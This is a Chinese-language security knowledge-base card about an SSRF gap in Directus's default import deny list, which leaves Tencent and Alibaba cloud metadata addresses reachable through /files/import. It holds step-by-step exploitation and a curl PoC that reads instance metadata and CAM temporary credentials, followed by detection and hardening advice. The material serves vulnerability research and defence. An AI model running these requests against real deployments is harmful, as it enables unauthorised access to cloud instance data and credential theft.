---
id: web-generic-ssrf-directus-default-denylist-domestic-cloud-metadata
title: Directus 默认 IMPORT_IP_DENY_LIST 只拦 AWS metadata，国产云 metadata 经文件导入直通
type: scenario
domain: web
path: web/generic/ssrf
technique: ssrf-denylist-coverage-gap
tags:
- directus
- ssrf
- cloud-metadata
- tencent-cloud
- aliyun
- denylist
- files-import
- low-code
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V68
  verified_at: '2026-11-05T12:02:45+08:00'
  notes: 已对照原文核对：IMPORT_IP_DENY_LIST 默认 ['0.0.0.0','169.254.169.254']（packages/env/src/constants/defaults.ts）；12.2.0 对 0.0.0.0 的修复加入 0.0.0.0/8 与 ::；getAxios 在连接前与 DNS 解析后两次查名单；具备 directus_files create 权限的 content-editor 经 /files/import 拉取 http://169.254.0.23/ 返回 200，读回 1.0/2017-09-19/latest/meta-data/ 目录，instance-id=ins-2axv5mea，uuid/hostname/local-ipv4/placement/region/network/interfaces/macs 均 200；AWS 169.254.169.254 对照被 503 denied IP 拦截；CAM security-credentials 因未绑角色为 404。均与原文一致。affected_versions 原为“Directus 12.2.0（原文实测默认配置；原文未标注该问题的修复版本）”，按规则 12.2.0 仅为原文复现环境/未给影响区间，已 set-versions --clear。未验证点：阿里云 100.100.100.200 在原文环境不可达、CAM 凭证为机制推演，卡内已注明；PoC 未在本机复跑；frontmatter 无 sources/source_url。
url: /docs/web/generic/ssrf/web-generic-ssrf-directus-default-denylist-domestic-cloud-metadata/
draft: false
kb_aliases:
- Directus 国产云 metadata SSRF
- IMPORT_IP_DENY_LIST 覆盖不全
- 169.254.0.23 SSRF
- 100.100.100.200 SSRF
- Directus files/import SSRF
---

## 一句话结论

Directus 的默认 `IMPORT_IP_DENY_LIST` 只有 `0.0.0.0` 和 `169.254.169.254` 两条，前者用于本机防护、后者是 AWS metadata；腾讯云 `169.254.0.23`、阿里云 `100.100.100.200` 等国产云 metadata 地址不在名单内，任何具备 `directus_files` 创建权限的账号都能通过 `/files/import` 让服务端拉取这些地址并把内容存成文件。

## 原理

- Directus 的文件导入接口 `POST /files/import` 接收用户提供的 `url`，由服务端发起请求下载，属于典型的服务端 URL 抓取入口。
- 防护实现在 axios 自定义 agent 上：`getAxios()` 返回的实例在连接前查一次 IP 黑名单，DNS 解析后再查一次，文件导入与 Flow 的 request 操作共用同一实例。
- 黑名单默认值在 `packages/env/src/constants/defaults.ts`：`IMPORT_IP_DENY_LIST: ['0.0.0.0', '169.254.169.254']`。也就是说默认只覆盖本机（0.0.0.0 的特殊处理）与 AWS 的 metadata 地址。
- 云厂商 metadata 服务地址并不统一：AWS 为 `169.254.169.254`，腾讯云为 `169.254.0.23`，阿里云为 `100.100.100.200`，华为云与 AWS 相同。默认名单只写 AWS，等于只对 AWS 部署生效；国产云实例上这些地址可达且不在拒绝列表，SSRF 直接放行。
- 为什么危害成立：metadata 是实例自述接口，无需认证、只对实例自身可达；SSRF 让服务器代替攻击者访问它，等于绕过网络边界读取实例身份信息。若实例绑定了 CAM/IAM 角色，对应凭证端点在 metadata 内直接可取，机制与 AWS 相同，只是地址不同。
- 权限边界：`/files/import` 需要 `directus_files` 的 create 权限。默认管理员具备，真实部署中内容编辑角色常被授予该权限（上传封面、附件是刚需），因此低权限内容账号即可触发。

## 触发条件

- 目标 Directus 使用默认或未补全国产云地址的 `IMPORT_IP_DENY_LIST`。
- 攻击者持有可创建文件的账号（`directus_files` create 权限），或存在其他可复用同一 `getAxios()` 的入口（如 Flow request 操作）。
- Directus 运行在国产云实例上（或网络可达对应 metadata 地址），且实例未在出口层阻断链路本地/内网 metadata。
- 实例绑定了云角色时，才能进一步读取临时凭证；未绑角色时只能读取实例指纹。

## 利用步骤

1. 登录获取 access token（普通账号即可，只要具备 `directus_files` create 权限）。
2. 调用 `POST /files/import`，`url` 填腾讯云 metadata 根路径 `http://169.254.0.23/`，确认返回 200 且文件入库。
3. 用 `/assets/<file_id>` 读回内容，确认 metadata 目录结构（`latest/`、`meta-data/` 等）被拉取。
4. 逐个拉取敏感端点：`/latest/meta-data/instance-id`、`uuid`、`hostname`、`local-ipv4`、`placement/region`、`network/interfaces/macs`。
5. 若实例绑定角色，拉取 `/latest/meta-data/cam/security-credentials/` 获取角色名，再拉取角色端点取得临时 AK/SK，配置后调用云 API。
6. 用 AWS 地址 `http://169.254.169.254/latest/meta-data/` 做对照，应被默认名单拦截（503 / denied IP），以此确认是名单覆盖缺口而非防护整体失效。

## PoC

```bash
# 登录取 token
TOKEN=$(curl -s -X POST http://target:8055/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"user@example.com","password":"***"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["data"]["access_token"])')

# 腾讯云 metadata 根路径（默认名单外）
curl -s -X POST http://target:8055/files/import \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.0.23/"}'

# 读回入库文件
curl -s http://target:8055/assets/<file_id> -H "Authorization: Bearer $TOKEN"

# 拉取实例 ID / 区域 / MAC
curl -s -X POST http://target:8055/files/import \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.0.23/latest/meta-data/instance-id"}'

# 绑角色时读取临时凭证目录
curl -s -X POST http://target:8055/files/import \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.0.23/latest/meta-data/cam/security-credentials/"}'
```

## 变体与关联

- 变体：阿里云 `http://100.100.100.200/latest/meta-data/` 同样不在默认名单；原文环境中该地址被防火墙阻断（HTTP 000），属“不在名单但环境未验证”，换到阿里云实例即可成立。
- 变体：华为云 metadata 与 AWS 同址，默认名单恰好覆盖；GCP/Azure 等需按其地址与请求头要求另测。
- 变体：同一 `getAxios()` 实例被 Flow 的 request 操作复用，匿名 Webhook Flow 也能打同一批地址（见关联卡片）。
- 关联：[[web-generic-ssrf-cloud-metadata]]（云 metadata SSRF 通用手法）；[[cloud-metadata-ssrf-imdsv2-token-credential]]（AWS IMDSv2 与凭证读取）。
- 关联：CVE-2026-61835 是 Directus 的 `0.0.0.0` 绕过（<12.0.0），修复补上了 `0.0.0.0/8` 与 `::`，但与本条“国产云地址不在默认名单”是不同问题；本条在 12.2.0 上依然成立。
- 边界：管理员已把国产云 metadata 地址或完整链路本地/内网网段加入 `IMPORT_IP_DENY_LIST`，或在网络层阻断 metadata 时，本手法不成立；实例未绑角色时只能拿到指纹，拿不到云凭证。

## 检测与防御

- 检测：审计 `/files/import` 的 `url` 参数是否出现 `169.254.0.23`、`100.100.100.200`、`169.254.169.254` 等 metadata 地址或 `latest/meta-data` 路径；关注低权限账号集中创建文件、`uploaded_by` 与外部 URL 的关联。
- 检测：出站流量中出现指向链路本地地址段（169.254.0.0/16）或 100.100.100.200 的 HTTP 请求，尤其是由应用服务器发起的。
- 防御：把 `IMPORT_IP_DENY_LIST` 补全为覆盖所有云厂商 metadata 地址与内网网段，例如 `0.0.0.0,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,169.254.0.0/16,169.254.169.254,169.254.0.23,100.100.100.200`；优先用网段而非单地址。
- 防御：最小化 `directus_files` create 权限的授予范围；在网络层限制应用出站到 metadata，实例侧用最小权限角色，避免绑定宽权限 CAM/IAM 角色。
- 加固：升级到包含 `0.0.0.0` 修复的版本只能解决 CVE-2026-61835，不能替代自行补全名单；补完配置后用对照地址复测，确认国产云地址变为 BLOCKED。
